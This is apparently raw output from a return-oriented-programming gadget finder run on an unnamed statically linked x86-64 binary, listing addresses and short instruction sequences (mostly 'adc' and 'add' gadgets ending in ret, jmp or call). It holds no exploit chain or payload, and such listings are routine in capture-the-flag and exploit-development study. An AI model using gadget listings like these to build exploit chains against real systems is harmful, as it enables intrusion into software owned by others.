Gadgets information
============================================================
0x000000000042f90f : adc al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000042f979 : adc al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000047746d : adc al, 0 ; add byte ptr [rax], al ; add rsp, 0x18 ; ret
0x000000000041fd55 : adc al, 0x13 ; jmp rdx
0x0000000000418015 : adc al, 0x16 ; sub eax, edx ; ret
0x0000000000447fa4 : adc al, 0x24 ; jmp 0x447f6d
0x000000000047718a : adc al, 0x24 ; mov edi, 1 ; call rax
0x0000000000406e31 : adc al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; call rdx
0x000000000046f450 : adc al, 0x48 ; add esp, 0x38 ; ret
0x0000000000436ce0 : adc al, 0x48 ; lea eax, [rdi + 0x14] ; ret
0x000000000049ce50 : adc al, 0x8f ; add byte ptr [rax], al ; lodsb al, byte ptr [rsi] ; pop rsi ; std ; jmp qword ptr [rdx]
0x000000000045e758 : adc al, 0x90 ; mov qword ptr [rax], rdx ; xor eax, eax ; ret
0x0000000000430da0 : adc al, 0x91 ; mov eax, dword ptr [rcx + rax*4] ; sub eax, edx ; ret
0x000000000042f4ce : adc al, 0x91 ; sub eax, edx ; ret
0x000000000041fd51 : adc al, 0x93 ; lea rdx, [r11 + rdx] ; jmp rdx
0x00000000004059e0 : adc al, 0x97 ; add rdx, rdi ; jmp rdx
0x0000000000416c17 : adc al, 0xa ; jmp r10
0x0000000000418183 : adc al, 0xa ; sub eax, edx ; ret
0x000000000043925f : adc al, 0xe ; cmp rdi, rdx ; jb 0x439272 ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000041c5fa : adc al, 0xe ; sub eax, edx ; ret
0x000000000041e2ca : adc al, 0xe ; sub eax, edx ; vzeroupper ; ret
0x000000000040a4ab : adc al, 0xf6 ; ret 0x7420
0x000000000047750d : adc al, 0xf7 ; ret
0x0000000000416836 : adc al, 1 ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x000000000046ca80 : adc al, 9 ; ret 0x8b48
0x000000000042fab7 : adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000042fb21 : adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000400fca : adc al, byte ptr [rdx] ; add byte ptr [rax], al ; call qword ptr [rbx + 0x10]
0x000000000046c897 : adc al, ch ; ret
0x0000000000416b7a : adc bh, byte ptr [rbx + 0xf480001] ; ret 0x66c3
0x00000000004541aa : adc bh, byte ptr [rdi + 3] ; add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0xb9e8
0x0000000000414268 : adc bl, bh ; sub byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00000000004331a5 : adc bl, ch ; call 0xffffffffc413bafa
0x00000000004330c5 : adc bl, ch ; call 0xffffffffc43bba1a
0x000000000046de52 : adc bl, ch ; jno 0x46dea8 ; shl ecx, cl ; mov qword ptr [rdi], r9 ; ret
0x000000000047d740 : adc bl, dh ; cli ; jmp qword ptr [rax]
0x0000000000436616 : adc bl, dh ; movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x0000000000436687 : adc bl, dh ; movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0x10], rcx ; ret
0x00000000004365e7 : adc bl, dh ; movq qword ptr [rdi], mm0 ; mov word ptr [rdi + 0x10], cx ; ret
0x0000000000436615 : adc bl, r14b ; movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x000000000046ac5a : adc byte ptr [r11 + 0x5d], bl ; pop r12 ; ret
0x000000000040fa35 : adc byte ptr [r11 + 0x5d], r11b ; ret
0x000000000040bbc6 : adc byte ptr [r11 + 6], r14b ; movzx eax, byte ptr [rax] ; ret
0x000000000046d52f : adc byte ptr [r8 + 0x5a], bl ; pop rbx ; ret
0x00000000004093e2 : adc byte ptr [r8 + 1], r9b ; ret
0x000000000040edff : adc byte ptr [r8 - 0x77], r9b ; ret 0xf8b
0x0000000000467dcf : adc byte ptr [r8 - 0x7d], cl ; ret
0x000000000040940d : adc byte ptr [r9 + 0x2b], r9b ; or byte ptr [r8 + 0x29], r9b ; ret
0x0000000000462ec7 : adc byte ptr [rax + 0x39], cl ; ret
0x000000000046d530 : adc byte ptr [rax + 0x5a], bl ; pop rbx ; ret
0x000000000044353c : adc byte ptr [rax + 0xf], cl ; ret 0x8b49
0x00000000004093e3 : adc byte ptr [rax + 1], cl ; ret
0x00000000004087f7 : adc byte ptr [rax + 1], cl ; ret 0x2b48
0x0000000000400dfe : adc byte ptr [rax - 0x39], cl ; ret 0
0x00000000004620d5 : adc byte ptr [rax - 0x73], cl ; or al, 0x8e ; add eax, dword ptr [rcx + rdx] ; ret
0x000000000043cadc : adc byte ptr [rax - 0x75], cl ; and al, 0x18 ; call rax
0x00000000004123f2 : adc byte ptr [rax - 0x77], cl ; and al, 8 ; call rcx
0x000000000041236f : adc byte ptr [rax - 0x77], cl ; and al, 8 ; call rsi
0x00000000004105e4 : adc byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x000000000045db37 : adc byte ptr [rax - 0x77], cl ; jo 0x45db55 ; mov qword ptr [rax + 0x40], rcx ; ret
0x000000000044ab51 : adc byte ptr [rax - 0x77], cl ; out dx, eax ; call r12
0x000000000045daf7 : adc byte ptr [rax - 0x77], cl ; push rax ; adc byte ptr [rax - 0x77], cl ; ret
0x00000000004419d7 : adc byte ptr [rax - 0x77], cl ; ret
0x00000000004127eb : adc byte ptr [rax - 0x77], cl ; ret 0x8948
0x000000000045f67d : adc byte ptr [rax - 0x77], cl ; ret 0x8949
0x000000000041360a : adc byte ptr [rax - 0x77], cl ; ret 0x8d4c
0x000000000040ee00 : adc byte ptr [rax - 0x77], cl ; ret 0xf8b
0x0000000000433387 : adc byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; call qword ptr [rbx]
0x00000000004333c3 : adc byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; ret
0x0000000000400fd0 : adc byte ptr [rax - 0x7d], cl ; ret
0x0000000000410bb3 : adc byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000445da0 : adc byte ptr [rax - 0x7d], cl ; ret 0x4902
0x000000000040bc34 : adc byte ptr [rax - 1], bh ; jmp 0x40bbf8
0x000000000043136c : adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000042fcc1 : adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000455b76 : adc byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx], ch ; ret 0xd089
0x000000000043a53c : adc byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x0000000000478438 : adc byte ptr [rbp + 0x13], dh ; xor eax, eax ; ret
0x0000000000475298 : adc byte ptr [rbp + 0x1d], dh ; xor eax, eax ; ret
0x000000000040ba44 : adc byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000408663 : adc byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x000000000040fa36 : adc byte ptr [rbx + 0x5d], bl ; ret
0x000000000049b9d3 : adc byte ptr [rbx + 0x80e5802], al ; ret
0x0000000000496dcb : adc byte ptr [rbx + 0x80e6402], al ; ret
0x000000000040bbc7 : adc byte ptr [rbx + 6], dh ; movzx eax, byte ptr [rax] ; ret
0x000000000047d7c8 : adc byte ptr [rbx + rdi*8], dh ; jmp rax
0x000000000043dc23 : adc byte ptr [rbx - 0x1e], dh ; ret
0x000000000040ea22 : adc byte ptr [rbx - 0x2fd6efb9], cl ; ret
0x0000000000473805 : adc byte ptr [rbx], ah ; add byte ptr [rax + 0x39], cl ; ret 0xf48
0x0000000000499afd : adc byte ptr [rbx], al ; ret 0xe01
0x0000000000473804 : adc byte ptr [rbx], spl ; add byte ptr [rax + 0x39], cl ; ret 0xf48
0x000000000040940e : adc byte ptr [rcx + 0x2b], cl ; or byte ptr [r8 + 0x29], r9b ; ret
0x00000000004517ac : adc byte ptr [rcx + 0xf660003], ch ; outsd dx, dword ptr [rsi] ; ret 0xb7e8
0x000000000045e983 : adc byte ptr [rcx + rcx*4 - 0x19], cl ; call rbx
0x0000000000447fa1 : adc byte ptr [rcx - 0x77], al ; adc al, 0x24 ; jmp 0x447f70
0x0000000000443ba2 : adc byte ptr [rcx - 0x77], cl ; add ecx, dword ptr [rax - 0x77] ; ret 0x3389
0x0000000000446319 : adc byte ptr [rcx - 0x77], cl ; add ecx, dword ptr [rax - 0x77] ; ret 0x3b89
0x000000000043c8eb : adc byte ptr [rcx - 0x77], cl ; ret
0x000000000040f987 : adc byte ptr [rcx - 0x7d], al ; ret
0x000000000041c68d : adc byte ptr [rcx - 0x7d], cl ; ret 0x7f10
0x0000000000497ec0 : adc byte ptr [rcx - 6], cl ; jmp qword ptr [rcx]
0x00000000004063a4 : adc byte ptr [rcx], al ; add byte ptr [rax], al ; pop rbx ; ret
0x000000000043ad69 : adc byte ptr [rcx], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040ea25 : adc byte ptr [rcx], ch ; rol bl, 1 ; mov eax, 0xffffffff ; ret
0x0000000000409d57 : adc byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x0000000000436ef3 : adc byte ptr [rdi], cl ; test esi, edx ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7510
0x000000000041ca71 : adc byte ptr [rdi], cl ; xchg ah, bl ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000041cb61 : adc byte ptr [rdi], cl ; xchg ah, ch ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000041c981 : adc byte ptr [rdi], cl ; xchg ah, cl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000041d3c9 : adc byte ptr [rdi], cl ; xchg byte ptr [rax + rax - 0x7cb80000], al ; ret 0xeb10
0x000000000041cf21 : adc byte ptr [rdi], cl ; xchg byte ptr [rax - 0x7cb80000], ch ; ret 0xeb10
0x000000000041c6b1 : adc byte ptr [rdi], cl ; xchg byte ptr [rbp + rcx - 0x7cb80000], bl ; ret 0xeb10
0x000000000041d101 : adc byte ptr [rdi], cl ; xchg byte ptr [rbx + rax], cl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000041c891 : adc byte ptr [rdi], cl ; xchg byte ptr [rbx + rcx - 0x7cb80000], bh ; ret 0xeb10
0x000000000041d2e1 : adc byte ptr [rdi], cl ; xchg byte ptr [rcx + rax], ch ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000041d1f1 : adc byte ptr [rdi], cl ; xchg byte ptr [rdx + rax], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000041cb33 : adc byte ptr [rdi], cl ; xchg byte ptr [rdx], bl ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000041cc23 : adc byte ptr [rdi], cl ; xchg byte ptr [rdx], ch ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000041ca43 : adc byte ptr [rdi], cl ; xchg byte ptr [rdx], cl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000041c7a1 : adc byte ptr [rdi], cl ; xchg byte ptr [rsp + rcx - 0x7cb80000], ch ; ret 0xeb10
0x000000000041c953 : adc byte ptr [rdi], cl ; xchg dl, bh ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000041c773 : adc byte ptr [rdi], cl ; xchg dl, bl ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000041c863 : adc byte ptr [rdi], cl ; xchg dl, ch ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000041c683 : adc byte ptr [rdi], cl ; xchg dl, cl ; or eax, 0x83480000 ; ret 0x4910
0x000000000043c0a9 : adc byte ptr [rdi], cl ; xchg eax, esp ; ret 0x2044
0x0000000000495717 : adc byte ptr [rdx + 0xe], al ; or byte ptr [rax + 0xb], cl ; add dh, byte ptr [rcx + 0xa] ; ret
0x0000000000420249 : adc byte ptr [rdx + 8], dh ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000041f18b : adc byte ptr [rdx], cl ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000041f03a : adc byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret
0x000000000041e635 : adc byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000416d65 : adc byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; fmul qword ptr [rcx - 0x7d] ; ret 0x7f10
0x000000000042b28b : adc byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; fmul qword ptr [rcx - 0x7d] ; ret 0xf10
0x000000000041675a : adc ch, byte ptr [rbp] ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x000000000046f42f : adc cl, byte ptr [rax - 0x7d] ; ret 0x4801
0x00000000004330b5 : adc cl, byte ptr [rax - 1] ; ret 0x2288
0x00000000004709ea : adc cl, byte ptr [rcx + 0x48b48d8] ; ret 0x8b48
0x000000000045f15a : adc cl, byte ptr [rcx] ; add byte ptr [rax], al ; cmove rax, rdx ; ret
0x000000000046048a : adc cl, byte ptr [rdx] ; add byte ptr [rax], al ; cmove rax, rdx ; ret
0x0000000000411e26 : adc dh, dh ; ret 0xf0f
0x000000000047df30 : adc dl, bh ; sti ; call qword ptr [rdx]
0x000000000045d05b : adc dword ptr [rax + 0x39], ecx ; ret 0x3873
0x000000000044a32d : adc dword ptr [rax - 0x39], ecx ; ret 0xffe0
0x00000000004093ff : adc dword ptr [rax - 0x3f], ecx ; cli ; add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret 0x2948
0x000000000040494f : adc dword ptr [rax - 0x7d], ecx ; ret
0x000000000043136b : adc dword ptr [rax], 0x83480000 ; ret 0x4910
0x000000000042fc57 : adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043126f : adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00000000004394b8 : adc dword ptr [rbx], eax ; ret
0x0000000000439431 : adc dword ptr [rbx], esp ; ret
0x0000000000467ff6 : adc dword ptr [rcx + 0x39], ecx ; ret 0x840f
0x000000000042abb7 : adc dword ptr [rcx + 7], edi ; ret
0x000000000040f80e : adc dword ptr [rcx + rax*2 + 0x48], esi ; mov dword ptr [rsi], ecx ; ret
0x000000000043942c : adc dword ptr [rcx - 0x30], eax ; movups xmmword ptr [r11], xmm4 ; ret
0x000000000042a852 : adc dword ptr [rcx - 1], ebx ; ret
0x000000000042a816 : adc dword ptr [rcx - 1], edi ; ret
0x00000000004394b3 : adc dword ptr [rdi + 0x30], edi ; movups xmmword ptr [r11], xmm8 ; ret
0x0000000000439213 : adc dword ptr [rdi + rdx - 0x10], ecx ; ret
0x0000000000439395 : adc dword ptr [rdi + rdx - 0x10], edx ; movups xmmword ptr [rdi + rdx - 0x20], xmm3 ; ret
0x000000000043939a : adc dword ptr [rdi + rdx - 0x20], ebx ; ret
0x0000000000439372 : adc dword ptr [rdi + rdx - 0x30], esi ; movups xmmword ptr [rdi + rdx - 0x40], xmm7 ; ret
0x0000000000439377 : adc dword ptr [rdi + rdx - 0x40], edi ; ret
0x000000000042ad19 : adc dword ptr [rdi - 8], edi ; ret
0x0000000000439210 : adc dword ptr [rdi], eax ; movups xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x000000000043900c : adc dword ptr [rdi], edx ; vmovups zmmword ptr [rsi - 0x40], zmm2 ; ret
0x0000000000415c7b : adc dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x000000000043913f : adc dword ptr [rsi + 3], edx ; ret
0x00000000004391dc : adc dword ptr [rsi + 7], edx ; ret
0x0000000000438fde : adc dword ptr [rsi - 1], edx ; ret
0x0000000000475116 : adc dword ptr [rsp - 0x28], eax ; ret
0x000000000042fc56 : adc dword ptr es:[rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000416834 : adc eax, 0x11407 ; cmovne rax, rdx ; ret
0x0000000000410265 : adc eax, 0x1480029 ; ret
0x0000000000415ce0 : adc eax, 0x1d4cb ; cmovne rax, rdx ; ret
0x0000000000416a10 : adc eax, 0x1df4b ; cmovne rax, rdx ; ret
0x00000000004167a5 : adc eax, 0x209c6 ; cmovne rax, rdx ; ret
0x0000000000415c79 : adc eax, 0x211d2 ; cmovne rax, rdx ; ret
0x000000000046d635 : adc eax, 0x235506 ; mov qword ptr [rax], rdx ; pop rbx ; ret
0x000000000044a309 : adc eax, 0x2587aa ; je 0x44a320 ; ret
0x0000000000415cb0 : adc eax, 0x25cb ; cmovne rax, rdx ; ret
0x000000000043eeb7 : adc eax, 0x261c1c ; pop rbx ; ret
0x000000000040f673 : adc eax, 0x2921b8 ; ret
0x0000000000460bab : adc eax, 0x30 ; cmovne rax, rdx ; ret
0x000000000041026f : adc eax, 0x39480029 ; ret
0x00000000004676b2 : adc eax, 0x4000003 ; xor eax, eax ; ret
0x0000000000415dba : adc eax, 0x4f71 ; cmovne rax, rdx ; ret
0x000000000042f7e1 : adc eax, 0x83480000 ; ret 0xe910
0x0000000000464edd : adc eax, 0x89000003 ; ret 0xe8c0
0x000000000046107a : adc eax, 0xe180d188 ; pcmpeqb mm3, qword ptr [rsi] ; ret
0x0000000000416ad4 : adc eax, 0xe697 ; cmovne rax, rdx ; ret
0x0000000000416994 : adc eax, 0xe7b7 ; cmovne rax, rdx ; ret
0x000000000043a064 : adc eax, 0xf880272 ; ret
0x00000000004604f5 : adc eax, 0xfffd9d16 ; cmove rax, rdx ; ret
0x00000000004310ce : adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000046ef59 : adc eax, eax ; ret
0x000000000046f096 : adc eax, edx ; pop rbp ; pop rbx ; ret
0x00000000004900c5 : adc ebp, dword ptr [rbx] ; fstp dword ptr [rbx + 0x4a315a58] ; ret 0x1b49
0x000000000040a937 : adc ebx, dword ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; pop r14 ; ret
0x00000000004620dc : adc ebx, esi ; ret
0x000000000040dc9a : adc ecx, dword ptr [rax - 0x7b] ; push qword ptr [rbp + rax - 0xa] ; ret 0x7401
0x0000000000406ff1 : adc ecx, dword ptr [rax - 0x7d] ; ret
0x00000000004479b4 : adc ecx, dword ptr [rcx + 0x29d231fb] ; ret
0x0000000000493008 : adc ecx, edx ; std ; call qword ptr [rbx]
0x000000000046aafe : adc edi, dword ptr [rcx] ; ret 0x840f
0x000000000046ab9b : adc edi, dword ptr [rcx] ; ret 0xc74
0x000000000045f18f : adc edi, edx ; dec dword ptr [rax + 1] ; ret
0x00000000004992b1 : adc edi, esi ; jmp qword ptr [rdi]
0x00000000004915de : adc esi, dword ptr [rbp - 0x60001a67] ; mov dh, 0xc7 ; ret 0xe71f
0x000000000040d3c3 : adc esi, dword ptr [rcx] ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rbx + 0x5d], bl ; ret
0x00000000004782ac : adc esi, dword ptr [rcx] ; ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rbx + 0x5d], bl ; ret
0x000000000040a4a9 : adc esi, dword ptr [rsp + rdx - 0xa] ; ret 0x7420
0x000000000042abb6 : adc qword ptr [rcx + 7], rdi ; ret
0x000000000042a851 : adc qword ptr [rcx - 1], rbx ; ret
0x000000000042a815 : adc qword ptr [rcx - 1], rdi ; ret
0x000000000042ad18 : adc qword ptr [rdi - 8], rdi ; ret
0x000000000043913e : adc qword ptr [rsi + 3], rdx ; ret
0x00000000004391db : adc qword ptr [rsi + 7], rdx ; ret
0x0000000000438fdd : adc qword ptr [rsi - 1], rdx ; ret
0x000000000046f095 : adc rax, rdx ; pop rbp ; pop rbx ; ret
0x0000000000499e7b : add ah, ah ; ret 0xfffb
0x000000000049992b : add ah, ah ; sbb bl, bh ; call qword ptr [rdx]
0x000000000043a48e : add ah, bh ; add eax, dword ptr [rax] ; pop rbx ; ret
0x000000000043a56b : add ah, bh ; inc dword ptr [rbx] ; div ecx ; pop rbx ; mov eax, eax ; ret
0x000000000043a4d9 : add ah, bh ; inc dword ptr [rbx] ; pop rbx ; ret
0x000000000043913a : add ah, byte ptr [rdx - 0xf] ; jl 0x43918f ; adc dword ptr [rsi + 3], edx ; ret
0x0000000000496dcd : add ah, byte ptr [rsi + rcx + 8] ; ret
0x0000000000495843 : add ah, ch ; ja 0x495842 ; call qword ptr [rdx]
0x0000000000499927 : add ah, ch ; pop rcx ; add byte ptr [rax], al ; in al, 0x18 ; sti ; call qword ptr [rdx]
0x000000000049bfdb : add ah, dh ; add al, 0xfd ; call rdx
0x00000000004009c9 : add ah, dh ; nop dword ptr [rax + rax] ; ret
0x0000000000498e0f : add ah, dl ; add byte ptr [rax], r8b ; sub al, 0xbd ; cli ; jmp qword ptr [rdx]
0x0000000000408f80 : add al, 0 ; add byte ptr [rax + 1], cl ; ret
0x000000000041cfe7 : add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000431f8f : add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000041d015 : add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00000000004783d0 : add al, 0 ; add byte ptr [rax], al ; jne 0x4783f7 ; ret
0x0000000000461103 : add al, 0 ; add byte ptr [rax], al ; ret
0x000000000045ef10 : add al, 0 ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x0000000000465e8a : add al, 0 ; add byte ptr [rbx - 0x76b7ffbb], cl ; ret 0x314c
0x0000000000416785 : add al, 0 ; add byte ptr [rsi - 9], dh ; ret 0
0x000000000043b3f1 : add al, 0 ; movsxd rax, dword ptr [rdx + rbx*4] ; add rax, rdx ; jmp rax
0x000000000043a435 : add al, 0 ; movsxd rax, dword ptr [rsi + rdi*4] ; add rax, rsi ; jmp rax
0x00000000004620db : add al, 0x11 ; ret
0x000000000043a524 : add al, 0x12 ; pop rbx ; and eax, 0x7ff80000 ; ret
0x000000000043ff6e : add al, 0x17 ; add al, ch ; ret 0xfc04
0x0000000000418011 : add al, 0x17 ; movzx edx, byte ptr [rsi + rdx] ; sub eax, edx ; ret
0x0000000000417faa : add al, 0x17 ; sub eax, ecx ; ret
0x0000000000495840 : add al, 0x19 ; add byte ptr [rax], al ; in al, dx ; ja 0x495845 ; call qword ptr [rdx]
0x000000000040f5e0 : add al, 0x22 ; sub dword ptr [rax], eax ; ret
0x0000000000475017 : add al, 0x24 ; add rsp, 0x38 ; pop rbx ; pop r14 ; ret
0x0000000000474d1b : add al, 0x24 ; add rsp, 0x38 ; ret
0x000000000043bcc8 : add al, 0x24 ; jmp 0x43bc69
0x000000000044a36a : add al, 0x25 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000046eeab : add al, 0x25 ; sub byte ptr [rax], al ; add byte ptr [rax], al ; jne 0x46eef7 ; leave ; ret
0x0000000000406ef7 : add al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; call rax
0x000000000045fc5e : add al, 0x31 ; ret
0x000000000045fb5a : add al, 0x37 ; ret
0x000000000040e09f : add al, 0x3a ; ret
0x000000000046b3c6 : add al, 0x48 ; cmp ecx, dword ptr [rdi + rsi] ; jae 0x46b37a ; xor eax, eax ; ret
0x0000000000436b4b : add al, 0x48 ; lea eax, [rdi + 5] ; ret
0x0000000000436059 : add al, 0x48 ; lea eax, [rdx + 4] ; ret
0x000000000043606b : add al, 0x48 ; lea eax, [rdx + 5] ; ret
0x0000000000477520 : add al, 0x48 ; mov dword ptr [rax], edx ; ret
0x000000000042775a : add al, 0x48 ; mov dword ptr [rdi], ecx ; ret
0x0000000000434899 : add al, 0x48 ; mov eax, edi ; ret
0x000000000045ff34 : add al, 0x48 ; xor eax, eax ; ret
0x00000000004607e8 : add al, 0x4c ; lea ecx, [rsp + 0x20] ; call rbx
0x0000000000436067 : add al, 0x66 ; mov dword ptr [rdx + 4], eax ; lea rax, [rdx + 5] ; ret
0x00000000004348a7 : add al, 0x66 ; mov dword ptr [rdx + 4], eax ; mov rax, rdi ; ret
0x00000000004479b2 : add al, 0x72 ; adc ecx, dword ptr [rcx + 0x29d231fb] ; ret
0x000000000045be28 : add al, 0x81 ; add rax, rcx ; jmp rax
0x000000000042f4cb : add al, 0x81 ; mov edx, dword ptr [rcx + rdx*4] ; sub eax, edx ; ret
0x0000000000430da3 : add al, 0x81 ; sub eax, edx ; ret
0x0000000000401b63 : add al, 0x82 ; add rax, rdx ; jmp rax
0x000000000043a9e8 : add al, 0x82 ; sub eax, dword ptr [rdx + rcx*4] ; je 0x43a9d8 ; ret
0x000000000042d0d7 : add al, 0x82 ; sub eax, ecx ; ret
0x000000000043ef89 : add al, 0x83 ; add rax, rbx ; jmp rax
0x00000000004763ba : add al, 0x84 ; add rax, r12 ; jmp rax
0x0000000000460bd9 : add al, 0x85 ; sal byte ptr [rbp - 0xe], cl ; ret
0x0000000000476cbb : add al, 0x86 ; add rax, r14 ; jmp rax
0x000000000045c53d : add al, 0x86 ; add rax, rsi ; jmp rax
0x0000000000475369 : add al, 0x87 ; add rax, r15 ; jmp rax
0x0000000000436056 : add al, 0x88 ; add al, 0x48 ; lea eax, [rdx + 4] ; ret
0x0000000000434896 : add al, 0x88 ; add al, 0x48 ; mov eax, edi ; ret
0x0000000000475143 : add al, 0x88 ; add rax, r8 ; jmp rax
0x000000000043a9eb : add al, 0x8a ; je 0x43a9d5 ; ret
0x000000000043a4f3 : add al, 0x96 ; add rax, rsi ; jmp rax
0x00000000004768f3 : add al, 0x99 ; add rax, r9 ; jmp rax
0x000000000043b3f5 : add al, 0x9a ; add rax, rdx ; jmp rax
0x0000000000467bdf : add al, 0xa6 ; add rax, rsi ; jmp rax
0x000000000043a439 : add al, 0xbe ; add rax, rsi ; jmp rax
0x000000000047d48c : add al, 0xc6 ; cli ; push qword ptr [rbp + rax*8 - 6] ; jmp rsp
0x000000000044ee65 : add al, 0xc6 ; jmp rax
0x000000000046efed : add al, 0xde ; lea r9, [rdx] ; jmp 0x46f049
0x0000000000472b3d : add al, 0xde ; lea r9, [rdx] ; jmp 0x472b99
0x0000000000448dd8 : add al, 0xe8 ; test rax, rax ; je 0x448de8 ; call rax
0x000000000047a6d1 : add al, 0xe8 ; test rax, rax ; je 0x47a6e1 ; call rax
0x0000000000403d4a : add al, 0xeb ; ret
0x000000000046f7d8 : add al, 0xf ; mov dh, 0xc0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000041c5f6 : add al, 0xf ; movzx edx, byte ptr [rsi + rcx] ; sub eax, edx ; ret
0x0000000000438f4b : add al, 0xf ; sub rax, rsi ; ret
0x0000000000459c81 : add al, 0xf0 ; jmp rax
0x0000000000427ac3 : add al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x000000000043ba6b : add al, 0xf3 ; ret
0x0000000000494441 : add al, 0xf7 ; call qword ptr [rdx]
0x000000000044f202 : add al, 0xf8 ; jmp rax
0x000000000049bfdd : add al, 0xfd ; call rdx
0x000000000049bfc9 : add al, 0xfd ; jmp qword ptr [rcx]
0x000000000041f897 : add al, 3 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00000000004324bd : add al, 7 ; cmp byte ptr [rax], sil ; cmovne rax, rdx ; ret
0x000000000044ee61 : add al, 7 ; mov rax, qword ptr [rsi + rax*8] ; jmp rax
0x00000000004326d8 : add al, 7 ; ret
0x000000000041817f : add al, 8 ; movzx edx, byte ptr [rdx + rcx] ; sub eax, edx ; ret
0x0000000000497e8f : add al, ah ; cli ; jmp qword ptr [rcx]
0x000000000049736f : add al, ah ; jle 0x497370 ; call qword ptr [rax]
0x000000000049c81b : add al, ah ; mov byte ptr [rax], al ; add al, dh ; xor ch, bh ; jmp qword ptr [rdx]
0x00000000004998ff : add al, ah ; sbb bl, bh ; call qword ptr [rbx]
0x00000000004974af : add al, al ; in al, dx ; stc ; jmp qword ptr [rbx]
0x00000000004998fb : add al, al ; pop rcx ; add byte ptr [rax], al ; loopne 0x499922 ; sti ; call qword ptr [rbx]
0x0000000000487907 : add al, al ; sldt word ptr [rax] ; ret
0x0000000000497ea7 : add al, bh ; cli ; jmp qword ptr [rcx]
0x000000000043a585 : add al, bh ; jg 0x43a587 ; int1 ; mov eax, eax ; ret
0x000000000049c833 : add al, bh ; mov byte ptr [rax], al ; add byte ptr [rax], cl ; xor ebp, edi ; jmp rdx
0x0000000000497133 : add al, bh ; xor dword ptr [rax], eax ; add byte ptr [rax], bh ; movsxd rdi, eax ; jmp qword ptr [rbx]
0x000000000049bfc7 : add al, bl ; add al, 0xfd ; jmp qword ptr [rcx]
0x0000000000499913 : add al, bl ; pop rcx ; add byte ptr [rax], al ; call 0x1149943d
0x00000000004330b1 : add al, byte ptr [rax + rax*8 - 0xb7ed8c] ; ret 0x2288
0x0000000000400fcb : add al, byte ptr [rax] ; add bh, bh ; push rbx ; adc byte ptr [rax - 0x7d], cl ; ret
